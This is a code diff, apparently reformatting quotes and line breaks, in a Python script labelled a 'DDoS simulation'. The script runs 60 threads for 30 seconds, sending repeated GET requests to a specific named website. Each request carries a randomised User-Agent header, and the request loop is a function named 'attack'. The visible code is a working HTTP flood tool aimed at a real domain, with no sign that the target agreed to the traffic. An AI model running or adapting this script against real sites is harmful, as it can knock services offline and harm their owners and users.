@@ -6,24 +6,29 @@ import time
 
 from fake_useragent import UserAgent
 
-URL = 'https://shaxzodbek.com'
+URL = "https://shaxzodbek.com"
 THREAD_COUNT = 60
 SIMULATION_DURATION = 30  # seconds
+
 
 def attack(thread_id, stop_time):
     ua = UserAgent()  # Local instance for process/thread safety
     while time.time() < stop_time:
         try:
-            headers = {'User-Agent': ua.random}
+            headers = {"User-Agent": ua.random}
             response = requests.get(URL, headers=headers, timeout=3)
-            print(f'Thread {thread_id} sent request, status code: {response.status_code}')
+            print(
+                f"Thread {thread_id} sent request, status code: {response.status_code}"
+            )
         except requests.exceptions.RequestException as e:
-            print(f'Thread {thread_id} encountered an error: {e}')
+            print(f"Thread {thread_id} encountered an error: {e}")
         time.sleep(random.uniform(0.1, 0.5))
 
 
 def run_ddos_simulation():
-    print(f'Starting DDoS simulation with {THREAD_COUNT} threads for {SIMULATION_DURATION} seconds...')
+    print(
+        f"Starting DDoS simulation with {THREAD_COUNT} threads for {SIMULATION_DURATION} seconds..."
+    )
     stop_time = time.time() + SIMULATION_DURATION
     threads = []
 
@@ -53,5 +58,5 @@ def main():
     print("All processes completed.")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
